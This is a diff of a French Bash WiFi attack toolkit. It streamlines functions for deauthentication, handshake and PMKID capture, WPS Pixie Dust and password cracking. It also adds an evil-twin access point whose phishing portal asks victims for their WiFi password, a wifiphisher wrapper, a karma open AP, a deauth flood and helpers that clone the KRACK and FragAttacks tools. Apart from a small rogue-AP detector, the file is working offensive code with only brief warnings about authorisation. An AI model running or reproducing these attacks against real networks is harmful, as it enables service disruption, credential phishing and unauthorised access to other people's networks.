-        echo -e "${BOLD}Clients connectés détectés pour cette cible :${NC}"
-        echo -e "  [${GREEN}0${NC}] ${BOLD}Déauthentification Broadcast (Tous les clients)${NC}"
+        echo "Clients détectés :"
+        echo "  [0] Broadcast (tous)"
         for idx in "${!client_list[@]}"; do
-            echo -e "  [${GREEN}$((idx + 1))${NC}] ${client_list[$idx]}"
+            echo "  [$((idx + 1))] ${client_list[$idx]}"
         done
-        echo ""
-        read -rp "Sélectionnez le client à déconnecter [0-${#client_list[@]}] (défaut: 0) : " c_choice
-        c_choice="${c_choice:-0}"
-        if [[ "$c_choice" =~ ^[0-9]+$ ]] && (( c_choice >= 1 && c_choice <= ${#client_list[@]} )); then
-            target_client=$(echo "${client_list[$((c_choice - 1))]}" | awk '{print $1}')
-            ok "Client spécifique ciblé : $target_client"
-        else
-            info "Ciblage global (Broadcast)."
+        read -rp "Choix [0-${#client_list[@]}] : " cc
+        cc="${cc:-0}"
+        if [[ "$cc" =~ ^[0-9]+$ ]] && (( cc >= 1 && cc <= ${#client_list[@]} )); then
+            target_client=$(echo "${client_list[$((cc - 1))]}" | awk '{print $1}')
         fi
-    else
-        info "Aucun client spécifique trouvé dans le dernier scan. Mode Broadcast utilisé."
     fi
 
-    local out_prefix="$LOGDIR/handshake_$(echo "$TARGET_BSSID" | tr -d ':')"
-    local cap_file="${out_prefix}-01.cap"
-    rm -f "${out_prefix}"*
+    local out="$LOGDIR/handshake_$(echo "$TARGET_BSSID" | tr -d ':')"
+    rm -f "${out}"*
 
-    # Verrouillage du canal
-    log "Calibrage de l'interface sur le canal $TARGET_CH..."
-    iw dev "$MONIFACE" set channel "$TARGET_CH" 2>/dev/null || airmon-ng start "$MONIFACE" "$TARGET_CH" >/dev/null 2>&1 || true
+    log "Verrouillage canal $TARGET_CH..."
+    iw dev "$MONIFACE" set channel "$TARGET_CH" 2>/dev/null || true
 
-    # Lancement de la capture airodump-ng en arrière-plan
-    log "Lancement de l'écoute airodump-ng..."
-    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$out_prefix" --output-format pcap,csv "$MONIFACE" >/dev/null 2>&1 &
-    local airodump_pid=$!
-
+    log "Capture airodump-ng..."
+    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$out" --output-format pcap,csv "$MONIFACE" >/dev/null 2>&1 &
+    local pid=$!
     sleep 2
 
-    # Envoi de la déauthentification
-    log "Envoi des paquets de déauthentification (aireplay-ng)..."
+    log "Déauthentification..."
     if [[ -n "$target_client" ]]; then
-        aireplay-ng --deauth 7 -a "$TARGET_BSSID" -c "$target_client" "$MONIFACE" || true
+        aireplay-ng --deauth 7 -a "$TARGET_BSSID" -c "$target_client" "$MONIFACE" 2>/dev/null || true
     else
-        aireplay-ng --deauth 7 -a "$TARGET_BSSID" "$MONIFACE" || true
+        aireplay-ng --deauth 7 -a "$TARGET_BSSID" "$MONIFACE" 2>/dev/null || true
     fi
 
-    # Boucle de vérification automatique du Handshake
-    log "Écoute active du Handshake WPA..."
-    info "Attente de la reconnexion du client (environ 15 secondes)..."
-    
-    local handshake_found=false
-    for _ in {1..15}; do
+    log "Attente handshake..."
+    local cap="${out}-01.cap"
+    local found=false
+    for _ in {1..20}; do
         sleep 1
         echo -n "."
-        if [[ -f "$cap_file" ]] && aircrack-ng "$cap_file" 2>&1 | grep -q "1 handshake"; then
-            handshake_found=true
-            break
+        if [[ -f "$cap" ]] && aircrack-ng "$cap" 2>&1 | grep -q "1 handshake"; then
+            found=true; break
         fi
     done
     echo ""
+    kill "$pid" 2>/dev/null || true
 
-    # Arrêt d'airodump-ng
-    kill "$airodump_pid" 2>/dev/null || true
-    wait "$airodump_pid" 2>/dev/null || true
-
-    if [[ "$handshake_found" == true ]]; then
-        ok "🏆 HANDSHAKE CAPTURÉ AVEC SUCCÈS !"
-        ok "Fichier de capture : ${GREEN}$cap_file${NC}"
-        LAST_CAPFILE="$cap_file"
+    if [[ "$found" == true ]]; then
+        ok "🏆 HANDSHAKE CAPTURÉ : $cap"
+        LAST_CAPFILE="$cap"
+        save_session
     else
         warn "Handshake non détecté automatiquement."
-        if [[ -f "$cap_file" ]]; then
-            info "Vérification manuelle avec aircrack-ng..."
-            aircrack-ng "$cap_file" | tee "$LOGDIR/check_handshake.log"
-            LAST_CAPFILE="$cap_file"
-        fi
+        [[ -f "$cap" ]] && aircrack-ng "$cap" | tee "$LOGDIR/check_hs.log"
+        LAST_CAPFILE="$cap"
     fi
     pause
 }
 
 capture_pmkid() {
     ensure_monitor_active || return
-
     draw_header
-    echo -e "${BOLD}--- CAPTURE PMKID (HCXDUMPTOOL - SANS CLIENT) ---${NC}\n"
+    echo -e "${BOLD}--- CAPTURE PMKID ---${NC}\n"
     
     if ! command -v hcxdumptool &>/dev/null; then
-        err "hcxdumptool n'est pas installé."
-        pause
-        return
+        err "hcxdumptool non installé."; pause; return
     fi
 
-    read -rp "Durée de la capture PMKID en secondes (ex: 60) [défaut: 45] : " duration
-    duration="${duration:-45}"
+    read -rp "Durée (s) [défaut: 45] : " dur
+    dur="${dur:-45}"
 
-    local pcap_out="$LOGDIR/pmkid_$(date +%s).pcapng"
-    local hash_out="$LOGDIR/pmkid_hashes.22000"
+    local pcap="$LOGDIR/pmkid_$(date +%s).pcapng"
+    local hash="$LOGDIR/pmkid_hashes.22000"
 
-    log "Lancement de hcxdumptool pendant $duration secondes..."
-    timeout "$duration" hcxdumptool -i "$MONIFACE" -o "$pcap_out" --enable_status=1 || true
+    log "hcxdumptool pendant ${dur}s..."
+    timeout "$dur" hcxdumptool -i "$MONIFACE" -o "$pcap" --enable_status=1 || true
 
-    if [[ -f "$pcap_out" ]]; then
-        ok "Capture enregistrée : $pcap_out"
-        log "Extraction des hashs PMKID (format hashcat 22000)..."
-        
+    if [[ -f "$pcap" ]]; then
+        ok "Capture : $pcap"
         if command -v hcxpcapngtool &>/dev/null; then
-            hcxpcapngtool -o "$hash_out" "$pcap_out" || true
-        elif command -v hcxhashtool &>/dev/null; then
-            hcxhashtool -i "$pcap_out" -o "$hash_out" --format=22000 || true
+            hcxpcapngtool -o "$hash" "$pcap" || true
         fi
-
-        if [[ -s "$hash_out" ]]; then
-            ok "🎉 PMKID trouvé et extrait dans : ${GREEN}$hash_out${NC}"
+        if [[ -s "$hash" ]]; then
+            ok "🎉 PMKID extrait : $hash"
         else
-            warn "Aucun PMKID extrait lors de cette session."
+            warn "Aucun PMKID trouvé."
         fi
-    else
-        err "Aucun paquet capturé."
     fi
     pause
 }
@@ -653,74 +670,347 @@ capture_pmkid() {
 wps_attack() {
     ensure_monitor_active || return
     ensure_target_selected || return
-
     draw_header
-    echo -e "${BOLD}--- ATTAQUE WPS PIXIE DUST (REAVER / PIXIEWPS) ---${NC}\n"
-    echo -e "Cible : ${GREEN}$TARGET_ESSID${NC} (${CYAN}$TARGET_BSSID${NC}) | Canal : ${YELLOW}$TARGET_CH${NC}"
-    echo ""
-
+    echo -e "${BOLD}--- WPS PIXIE DUST ---${NC}\n"
+    
     if ! command -v reaver &>/dev/null; then
-        err "reaver n'est pas installé."
-        pause
-        return
+        err "reaver non installé."; pause; return
     fi
 
-    log "Lancement de reaver avec l'option Pixie Dust (-K 1)..."
+    log "Reaver Pixie Dust (-K 1)..."
     reaver -i "$MONIFACE" -b "$TARGET_BSSID" -c "$TARGET_CH" -K 1 -vv \
-        2>&1 | tee "$LOGDIR/reaver_pixie_$(echo "$TARGET_BSSID" | tr -d ':').log"
-    
+        2>&1 | tee "$LOGDIR/reaver_$(echo "$TARGET_BSSID" | tr -d ':').log"
     pause
 }
 
 run_wifite() {
     ensure_monitor_active || return
-
     draw_header
-    echo -e "${BOLD}--- LANCEMENT DE WIFITE (MODE AUTOMATISÉ) ---${NC}\n"
-    
     if ! command -v wifite &>/dev/null; then
-        err "wifite n'est pas installé."
-        pause
-        return
+        err "wifite non installé."; pause; return
     fi
-
-    log "Démarrage de wifite sur $MONIFACE..."
-    wifite -i "$MONIFACE" 2>&1 | tee "$LOGDIR/wifite_session.log"
+    log "Wifite sur $MONIFACE..."
+    wifite -i "$MONIFACE" 2>&1 | tee "$LOGDIR/wifite.log"
     pause
 }
 
 # ==============================
-# SÉLECTION AUTOMATIQUE FICHIERS & WORDLISTS
+# ATTAQUES AVANCÉES
 # ==============================
-select_cap_file() {
-    local caps=()
-    # Recherche des .cap dans le dossier de log actuel et home
-    while IFS= read -r f; do
-        [[ -f "$f" ]] && caps+=("$f")
-    done < <(find "$LOGDIR" -maxdepth 2 -name "*.cap" 2>/dev/null)
+evil_twin_classic() {
+    draw_header
+    echo -e "${BOLD}--- EVIL TWIN CLASSIQUE (Airbase-ng) ---${NC}\n"
+    warn "⚠️ ATTAQUE INTRUSIVE - Nécessite autorisation explicite ⚠️"
+    read -rp "Continuer ? (o/n) : " c
+    [[ ! "$c" =~ ^[oOyY]$ ]] && return
 
-    if [[ -n "$LAST_CAPFILE" && -f "$LAST_CAPFILE" ]]; then
-        # Place le dernier cap en premier si pas déjà listé
-        if [[ ! " ${caps[*]} " =~ " ${LAST_CAPFILE} " ]]; then
-            caps=("$LAST_CAPFILE" "${caps[@]}")
+    ensure_monitor_active || return
+    ensure_target_selected || return
+
+    if [[ -z "$SECOND_IFACE" ]]; then
+        warn "2ème interface recommandée pour Evil Twin."
+        read -rp "Sélectionner maintenant ? (o/n) : " r
+        [[ "$r" =~ ^[oOyY]$ ]] && select_second_interface
+        if [[ -z "$SECOND_IFACE" ]]; then
+            warn "Utilisation de $MONIFACE (limité)."
+            SECOND_IFACE="$MONIFACE"
         fi
     fi
 
-    echo -e "${BOLD}Sélection du fichier de capture (.cap) :${NC}"
-    if [[ ${#caps[@]} -gt 0 ]]; then
-        for i in "${!caps[@]}"; do
-            echo -e "  [${GREEN}$((i + 1))${NC}] ${caps[$i]}"
-        done
-    fi
-    echo -e "  [${YELLOW}m${NC}] Entrer manuellement un autre chemin"
-    echo -e "  [${YELLOW}0${NC}] Annuler"
-    echo ""
+    local fake_ssid="${TARGET_ESSID:-EvilTwin}"
+    [[ "$fake_ssid" == "<Masqué>" ]] && read -rp "ESSID à cloner : " fake_ssid
+    
+    local channel_evil=1
+    [[ "$TARGET_CH" -lt 6 ]] && channel_evil=11 || channel_evil=1
 
-    read -rp "Choix : " cap_pick
-    if [[ "$cap_pick" =~ ^[0-9]+$ ]] && (( cap_pick >= 1 && cap_pick <= ${#caps[@]} )); then
-        SELECTED_CAP="${caps[$((cap_pick - 1))]}"
-    elif [[ "$cap_pick" == "m" || "$cap_pick" == "M" ]]; then
-        read -rp "Chemin absolu du fichier .cap : " SELECTED_CAP
+    log "Création faux AP : $fake_ssid sur canal $channel_evil..."
+    
+    # Arrêt des services conflitants
+    systemctl stop NetworkManager 2>/dev/null || true
+
+    # Démarrage airbase-ng
+    airbase-ng -c "$channel_evil" -e "$fake_ssid" -P -C 20 "$SECOND_IFACE" > "$LOGDIR/airbase.log" 2>&1 &
+    EVIL_TWIN_PID=$!
+    sleep 3
+
+    # Configuration bridge at0
+    ip addr add 192.168.2.1/24 dev at0 2>/dev/null || true
+    ip link set at0 up 2>/dev/null || true
+
+    # DHCP server
+    cat > /tmp/evil_dnsmasq.conf << EOF
+interface=at0
+dhcp-range=192.168.2.10,192.168.2.100,255.255.255.0,12h
+dhcp-option=3,192.168.2.1
+dhcp-option=6,192.168.2.1
+server=8.8.8.8
+log-queries
+log-facility=$LOGDIR/dnsmasq.log
+EOF
+
+    dnsmasq -C /tmp/evil_dnsmasq.conf -p0 > /dev/null 2>&1 &
+    local dhcp_pid=$!
+
+    # Serveur web phishing simple
+    mkdir -p /tmp/evil_portal
+    cat > /tmp/evil_portal/index.html << 'EOF'
+<!DOCTYPE html><html><head><title>Portail WiFi</title></head>
+<body style="font-family:Arial;text-align:center;padding:50px">
+<h2>Mise à jour de sécurité requise</h2>
+<p>Veuillez confirmer vos identifiants WiFi pour continuer</p>
+<form method="POST" action="/login">
+<input type="password" name="pwd" placeholder="Mot de passe WiFi">
+<button type="submit">Valider</button>
+</form></body></html>
+EOF
+
+    cd /tmp/evil_portal
+    python3 -m http.server 80 > "$LOGDIR/portal.log" 2>&1 &
+    local http_pid=$!
+    cd - > /dev/null
+
+    # NAT
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
+
+    ok "🎭 Evil Twin ACTIF !"
+    info "SSID: $fake_ssid | IP: 192.168.2.1 | Portail: http://192.168.2.1"
+    warn "Lancez une déauth sur le vrai AP pour forcer les reconnections."
+    info "Appuyez sur [Entrée] pour arrêter l'Evil Twin..."
+    read -r
+
+    # Cleanup
+    kill "$EVIL_TWIN_PID" "$dhcp_pid" "$http_pid" 2>/dev/null || true
+    wait "$EVIL_TWIN_PID" 2>/dev/null || true
+    rm -f /tmp/evil_dnsmasq.conf
+    rm -rf /tmp/evil_portal
+    iptables -t nat -F 2>/dev/null || true
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+    EVIL_TWIN_PID=""
+    systemctl start NetworkManager 2>/dev/null || true
+    ok "Evil Twin arrêté."
+    info "Logs dans : $LOGDIR"
+    pause
+}
+
+evil_twin_wifiphisher() {
+    draw_header
+    echo -e "${BOLD}--- EVIL TWIN WIFIPISHER ---${NC}\n"
+    warn "⚠️ Phishing automatisé avancé - Autorisation requise ⚠️"
+    
+    if ! command -v wifiphisher &>/dev/null; then
+        err "wifiphisher non installé."
+        read -rp "Installer via pip ? (o/n) : " i
+        [[ "$i" =~ ^[oOyY]$ ]] && pip3 install wifiphisher 2>/dev/null
+        command -v wifiphisher &>/dev/null || { err "Installation échouée."; pause; return; }
+    fi
+
+    ensure_monitor_active || return
+    ensure_target_selected || return
+
+    if [[ -z "$SECOND_IFACE" ]]; then
+        warn "Wifiphisher nécessite idéalement 2 interfaces."
+        select_second_interface
+    fi
+
+    local cmd="wifiphisher"
+    if [[ -n "$SECOND_IFACE" && "$SECOND_IFACE" != "$MONIFACE" ]]; then
+        cmd="$cmd -aI $SECOND_IFACE -jI $MONIFACE"
+    else
+        cmd="$cmd -jI $MONIFACE"
+    fi
+    cmd="$cmd -eSSID $TARGET_ESSID -eBSSID $TARGET_BSSID -c $TARGET_CH"
+
+    log "Lancement wifiphisher..."
+    info "Interface web : http://localhost:64857"
+    info "Ctrl+C pour arrêter"
+    $cmd 2>&1 | tee "$LOGDIR/wifiphisher.log"
+    pause
+}
+
+karma_attack() {
+    draw_header
+    echo -e "${BOLD}--- KARMA ATTACK (MANA / Probe Responses) ---${NC}\n"
+    warn "⚠️ Cette attaque répond aux Probe Requests des clients"
+    warn "pour se faire passer pour tous les réseaux connus."
+    
+    if ! command -v hostapd &>/dev/null; then
+        err "hostapd non installé."; pause; return
+    fi
+
+    ensure_monitor_active || return
+
+    local iface="${SECOND_IFACE:-$MONIFACE}"
+    cat > /tmp/karma_hostapd.conf << EOF
+interface=$iface
+driver=nl80211
+ssid=FreeWiFi_Public
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=0
+EOF
+
+    log "Lancement hostapd karma..."
+    info "AP 'FreeWiFi_Public' actif sur canal 6"
+    info "Ctrl+C pour arrêter"
+    hostapd /tmp/karma_hostapd.conf 2>&1 | tee "$LOGDIR/karma.log"
+    rm -f /tmp/karma_hostapd.conf
+    pause
+}
+
+detect_rogue_ap() {
+    ensure_monitor_active || return
+    draw_header
+    echo -e "${BOLD}--- DÉTECTION ROGUE AP ---${NC}\n"
+    log "Scan passif des AP suspects (15s)..."
+    info "Recherche de BSSID clonés, canaux incohérents, SSID suspects..."
+
+    local csv="$LOGDIR/rogue_scan"
+    rm -f "${csv}"*
+    timeout --foreground 15 airodump-ng "$MONIFACE" --write "$csv" --output-format csv >/dev/null 2>&1 || true
+
+    local file="${csv}-01.csv"
+    [[ ! -f "$file" ]] && { err "Scan échoué."; pause; return; }
+
+    echo ""
+    echo "🔍 Analyse des anomalies :"
+    
+    # Détection : même SSID mais BSSID différent
+    local ssids
+    ssids=$(awk -F', ' '$6 !~ /OPN/ && $14 != "" {print $14}' "$file" | sort | uniq -c | awk '$1 > 1 {print $2}')
+    
+    if [[ -n "$ssids" ]]; then
+        warn "⚠️ SSID dupliqués détectés (potentiels clones) :"
+        echo "$ssids"
+    fi
+
+    # Recherche d'AP ouverts
+    local open_aps
+    open_aps=$(awk -F', ' '$6 == "OPN" && $14 != "" {print $1 " -> " $14}' "$file")
+    if [[ -n "$open_aps" ]]; then
+        warn "⚠️ AP ouverts détectés :"
+        echo "$open_aps"
+    fi
+
+    # Signal très fort (AP proche)
+    local strong
+    strong=$(awk -F', ' '$9 < -30 && $14 != "" {print $1 " ["$14"] Pwr:"$9"dB"}' "$file")
+    if [[ -n "$strong" ]]; then
+        info "AP à très fort signal (proches) :"
+        echo "$strong"
+    fi
+
+    echo ""
+    info "Analyse complète dans : $file"
+    pause
+}
+
+stress_test_deauth() {
+    ensure_monitor_active || return
+    ensure_target_selected || return
+    draw_header
+    echo -e "${BOLD}--- STRESS TEST (DEAUTH FLOOD) ---${NC}\n"
+    warn "⚠️ Test de résistance aux attaques de déauthentification"
+    
+    read -rp "Durée (s) [défaut: 30] : " dur
+    dur="${dur:-30}"
+
+    log "Flood de déauth sur $TARGET_BSSID pendant ${dur}s..."
+    info "Testez si le réseau résiste (ex: 802.11w PMF activé)."
+    
+    timeout "$dur" aireplay-ng --deauth 0 -a "$TARGET_BSSID" "$MONIFACE" 2>&1 | tee "$LOGDIR/stress.log"
+    
+    echo ""
+    info "Analyse : si les clients ne se déconnectent pas, le PMF (802.11w) est actif."
+    pause
+}
+
+krack_test() {
+    draw_header
+    echo -e "${BOLD}--- TEST VULNÉRABILITÉ KRACK ---${NC}\n"
+    warn "⚠️ Nécessite l'outil KRACK de Vanhoefm"
+    
+    if ! command -v python3 &>/dev/null; then
+        err "Python3 requis."; pause; return
+    fi
+
+    local krack_dir="/opt/krackattacks-test"
+    if [[ ! -d "$krack_dir" ]]; then
+        warn "Outil KRACK non trouvé."
+        read -rp "Cloner depuis GitHub ? (o/n) : " r
+        if [[ "$r" =~ ^[oOyY]$ ]]; then
+            git clone https://github.com/krackattacks-test/krackattacks-test.git "$krack_dir" 2>/dev/null || {
+                err "Clonage échoué."; pause; return
+            }
+            cd "$krack_dir" && pip3 install -r requirements.txt 2>/dev/null
+            cd - > /dev/null
+        else
+            return
+        fi
+    fi
+
+    ensure_target_selected || return
+    log "Lancement test KRACK sur $TARGET_ESSID..."
+    info "Suivez les instructions de l'outil..."
+    cd "$krack_dir"
+    python3 krackAttack/krack_all_zero.py -h 2>/dev/null || info "Utilisez les scripts dans $krack_dir"
+    cd - > /dev/null
+    pause
+}
+
+fragattacks_test() {
+    draw_header
+    echo -e "${BOLD}--- TEST FRAGATTACKS (802.11 fragmentation) ---${NC}\n"
+    
+    local tool_dir="/opt/fragattacks"
+    if [[ ! -d "$tool_dir" ]]; then
+        warn "Outil FragAttacks non trouvé."
+        read -rp "Cloner depuis GitHub ? (o/n) : " r
+        if [[ "$r" =~ ^[oOyY]$ ]]; then
+            git clone https://github.com/vanhoefm/fragattacks.git "$tool_dir" 2>/dev/null || {
+                err "Clonage échoué."; pause; return
+            }
+        else
+            return
+        fi
+    fi
+
+    info "Outil disponible dans : $tool_dir"
+    info "Voir https://www.fragattacks.com pour la doc."
+    info "Lancement interactif..."
+    cd "$tool_dir" && python3 fragattack.py -h 2>/dev/null || bash
+    cd - > /dev/null
+    pause
+}
+
+# ==============================
+# CRACKING
+# ==============================
+select_cap_file() {
+    local caps=()
+    while IFS= read -r f; do
+        [[ -f "$f" ]] && caps+=("$f")
+    done < <(find "$HOME/wifi_audit_logs" -name "*.cap" 2>/dev/null | head -20)
+
+    [[ -n "$LAST_CAPFILE" && -f "$LAST_CAPFILE" ]] && {
+        [[ ! " ${caps[*]} " =~ " ${LAST_CAPFILE} " ]] && caps=("$LAST_CAPFILE" "${caps[@]}")
+    }
+
+    echo -e "${BOLD}Fichiers .cap disponibles :${NC}"
+    for i in "${!caps[@]}"; do
+        echo "  [$((i + 1))] ${caps[$i]}"
+    done
+    echo "  [m] Entrer manuellement"
+    echo "  [0] Annuler"
+    read -rp "Choix : " p
+    
+    if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#caps[@]} )); then
+        SELECTED_CAP="${caps[$((p - 1))]}"
+    elif [[ "$p" == "m" ]]; then
+        read -rp "Chemin .cap : " SELECTED_CAP
     else
         SELECTED_CAP=""
     fi
@@ -728,44 +1018,49 @@ select_cap_file() {
 
 select_wordlist() {
     local lists=()
-    local common_lists=(
+    local common=(
         "/usr/share/wordlists/rockyou.txt"
         "/usr/share/wordlists/rockyou.txt.gz"
         "/usr/share/wordlists/fasttrack.txt"
         "/usr/share/john/password.lst"
-        "/usr/share/wordlists/metasploit/password.lst"
+        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
     )
 
-    for wl in "${common_lists[@]}"; do
-        if [[ -f "$wl" ]]; then
-            lists+=("$wl")
-        fi
+    # Recherche dynamique
+    while IFS= read -r f; do
+        [[ -f "$f" ]] && lists+=("$f")
+    done < <(find /usr /opt "$HOME" -name "rockyou*" -o -name "*.lst" -o -name "*password*.txt" 2>/dev/null | head -10)
+
+    for wl in "${common[@]}"; do
+        [[ -f "$wl" && ! " ${lists[*]} " =~ " ${wl} " ]] && lists+=("$wl")
     done
 
-    echo -e "${BOLD}Sélection de la Wordlist (Dictionnaire) :${NC}"
-    if [[ ${#lists[@]} -gt 0 ]]; then
-        for i in "${!lists[@]}"; do
-            echo -e "  [${GREEN}$((i + 1))${NC}] ${lists[$i]}"
-        done
-    fi
-    echo -e "  [${YELLOW}m${NC}] Entrer manuellement un autre chemin de dictionnaire"
-    echo -e "  [${YELLOW}0${NC}] Annuler"
-    echo ""
-
-    read -rp "Choix : " wl_pick
-    if [[ "$wl_pick" =~ ^[0-9]+$ ]] && (( wl_pick >= 1 && wl_pick <= ${#lists[@]} )); then
-        SELECTED_WL="${lists[$((wl_pick - 1))]}"
-        # Décompression automatique si rockyou.txt.gz
+    echo -e "${BOLD}Wordlists détectées :${NC}"
+    for i in "${!lists[@]}"; do
+        echo "  [$((i + 1))] ${lists[$i]}"
+    done
+    echo "  [m] Manuel | [d] Télécharger rockyou.txt | [0] Annuler"
+    read -rp "Choix : " p
+    
+    if [[ "$p" =~ ^[0-9]+$ ]] && (( p >= 1 && p <= ${#lists[@]} )); then
+        SELECTED_WL="${lists[$((p - 1))]}"
         if [[ "$SELECTED_WL" == *.gz ]]; then
-            local decompressed="/usr/share/wordlists/rockyou.txt"
-            if [[ ! -f "$decompressed" ]]; then
-                log "Décompression de $SELECTED_WL..."
-                gunzip -k "$SELECTED_WL" 2>/dev/null || gzip -d -c "$SELECTED_WL" > "$decompressed"
-                SELECTED_WL="$decompressed"
+            local dec="${SELECTED_WL%.gz}"
+            if [[ ! -f "$dec" ]]; then
+                log "Décompression..."
+                gunzip -k "$SELECTED_WL" 2>/dev/null || gzip -d -c "$SELECTED_WL" > "$dec"
             fi
+            SELECTED_WL="$dec"
         fi
-    elif [[ "$wl_pick" == "m" || "$wl_pick" == "M" ]]; then
-        read -rp "Chemin absolu du dictionnaire : " SELECTED_WL
+    elif [[ "$p" == "m" ]]; then
+        read -rp "Chemin : " SELECTED_WL
+    elif [[ "$p" == "d" ]]; then
+        local target="/usr/share/wordlists/rockyou.txt.gz"
+        mkdir -p /usr/share/wordlists
+        log "Téléchargement rockyou.txt..."
+        curl -L -o "$target" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null
+        [[ -f "$target" ]] && gunzip -k "$target" 2>/dev/null
+        SELECTED_WL="/usr/share/wordlists/rockyou.txt"
     else
         SELECTED_WL=""
     fi
@@ -773,76 +1068,82 @@ select_wordlist() {
 
 crack_handshake() {
     draw_header
-    echo -e "${BOLD}--- CRACKING DE HANDSHAKE (AIRCRACK-NG) ---${NC}\n"
-
-    local SELECTED_CAP=""
-    local SELECTED_WL=""
-
+    echo -e "${BOLD}--- CRACKING HANDSHAKE ---${NC}\n"
+    
     select_cap_file
-    if [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]]; then
-        err "Fichier .cap non sélectionné ou introuvable."
-        pause
-        return
-    fi
-
+    [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]] && { err "Fichier invalide."; pause; return; }
+    
     echo ""
     select_wordlist
-    if [[ -z "$SELECTED_WL" || ! -f "$SELECTED_WL" ]]; then
-        err "Dictionnaire non sélectionné ou introuvable."
-        pause
-        return
+    [[ -z "$SELECTED_WL" || ! -f "$SELECTED_WL" ]] && { err "Wordlist invalide."; pause; return; }
+
+    log "Cracking avec aircrack-ng..."
+    echo "  Capture : $SELECTED_CAP"
+    echo "  Wordlist: $SELECTED_WL"
+    if [[ -n "$TARGET_BSSID" ]]; then
+        aircrack-ng -w "$SELECTED_WL" -b "$TARGET_BSSID" "$SELECTED_CAP" | tee "$LOGDIR/crack.log"
+    else
+        aircrack-ng -w "$SELECTED_WL" "$SELECTED_CAP" | tee "$LOGDIR/crack.log"
+    fi
+    pause
+}
+
+crack_pmkid() {
+    draw_header
+    echo -e "${BOLD}--- CRACKING PMKID (Hashcat/Aircrack) ---${NC}\n"
+    
+    mapfile -t hashes < <(find "$HOME/wifi_audit_logs" -name "*.22000" 2>/dev/null)
+    if [[ ${#hashes[@]} -eq 0 ]]; then
+        err "Aucun fichier .22000 trouvé."; pause; return
     fi
 
-    log "Lancement d'aircrack-ng..."
-    echo -e "  Capture  : ${GREEN}$SELECTED_CAP${NC}"
-    echo -e "  Wordlist : ${CYAN}$SELECTED_WL${NC}"
-    if [[ -n "$TARGET_BSSID" ]]; then
-        echo -e "  Filtre BSSID : ${YELLOW}$TARGET_BSSID${NC}"
-        aircrack-ng -w "$SELECTED_WL" -b "$TARGET_BSSID" "$SELECTED_CAP" | tee "$LOGDIR/crack_result.log"
+    for i in "${!hashes[@]}"; do
+        echo "  [$((i + 1))] ${hashes[$i]}"
+    done
+    read -rp "Choix : " h
+    [[ ! "$h" =~ ^[0-9]+$ ]] && return
+    local hf="${hashes[$((h - 1))]}"
+    
+    select_wordlist
+    [[ -z "$SELECTED_WL" ]] && return
+
+    if command -v hashcat &>/dev/null; then
+        ok "Hashcat détecté (GPU)..."
+        hashcat -m 22000 -a 0 "$hf" "$SELECTED_WL" --force 2>&1 | tee "$LOGDIR/pmkid_crack.log"
     else
-        aircrack-ng -w "$SELECTED_WL" "$SELECTED_CAP" | tee "$LOGDIR/crack_result.log"
+        warn "Hashcat absent, fallback aircrack-ng (CPU)..."
+        aircrack-ng -w "$SELECTED_WL" "$hf" 2>&1 | tee "$LOGDIR/pmkid_crack.log"
     fi
     pause
 }
 
 verify_handshake() {
     draw_header
-    echo -e "${BOLD}--- VÉRIFICATION DE VALIDITÉ D'UN HANDSHAKE ---${NC}\n"
-    
-    local SELECTED_CAP=""
     select_cap_file
-    if [[ -z "$SELECTED_CAP" || ! -f "$SELECTED_CAP" ]]; then
-        err "Fichier de capture introuvable."
-        pause
-        return
-    fi
-
-    log "Analyse des paquets WPA dans : $SELECTED_CAP"
+    [[ -z "$SELECTED_CAP" ]] && return
     aircrack-ng "$SELECTED_CAP"
     pause
 }
 
 # ==============================
-# SOUS-MENUS THÉMATIQUES
+# MENUS
 # ==============================
 submenu_interfaces() {
     while true; do
         draw_header
-        echo -e "${BOLD}=== GESTION DE L'INTERFACE & MODE MONITOR ===${NC}\n"
-        echo "  [1] Sélectionner une interface WiFi"
-        echo "  [2] Activer le mode monitor"
-        echo "  [3] Désactiver le mode monitor & restaurer NetworkManager"
-        echo "  [4] Changer l'adresse MAC (Aléatoire / Perso / Reset)"
-        echo "  [0] Retour au menu principal"
-        echo ""
-        read -rp "Choix : " opt
-        case "$opt" in
-            1) select_interface ;;
-            2) enable_monitor ;;
-            3) disable_monitor ;;
-            4) change_mac ;;
-            0|r|R) break ;;
-            *) err "Option invalide."; pause ;;
+        echo -e "${BOLD}=== INTERFACE & MONITOR ===${NC}\n"
+        echo "  [1] Sélectionner interface WiFi"
+        echo "  [2] Activer mode monitor"
+        echo "  [3] Désactiver mode monitor"
+        echo "  [4] Changer adresse MAC"
+        echo "  [5] Test d'injection de paquets"
+        echo "  [6] Sélectionner 2ème interface (Evil Twin)"
+        echo "  [0] Retour"
+        read -rp "Choix : " o
+        case "$o" in
+            1) select_interface ;; 2) enable_monitor ;; 3) disable_monitor ;;
+            4) change_mac ;; 5) test_injection ;; 6) select_second_interface ;;
+            0) break ;; *) err "Invalide."; pause ;;
         esac
     done
 }
@@ -850,21 +1151,52 @@ submenu_interfaces() {
 submenu_attacks() {
     while true; do
         draw_header
-        echo -e "${BOLD}=== ATTAQUES & CAPTURES SUR LA CIBLE ACTIVE ===${NC}\n"
-        echo "  [1] Capturer un Handshake WPA/WPA2 (Déauth ciblée ou broadcast)"
-        echo "  [2] Capturer un PMKID sans client (hcxdumptool)"
-        echo "  [3] Attaque WPS Pixie Dust (Reaver + Pixiewps)"
-        echo "  [4] Lancer Wifite (Audit complet automatisé)"
-        echo "  [0] Retour au menu principal"
-        echo ""
-        read -rp "Choix : " opt
-        case "$opt" in
-            1) capture_handshake ;;
-            2) capture_pmkid ;;
-            3) wps_attack ;;
-            4) run_wifite ;;
-            0|r|R) break ;;
-            *) err "Option invalide."; pause ;;
+        echo -e "${BOLD}=== CAPTURES CLASSIQUES ===${NC}\n"
+        echo "  [1] Handshake WPA/WPA2"
+        echo "  [2] PMKID (hcxdumptool)"
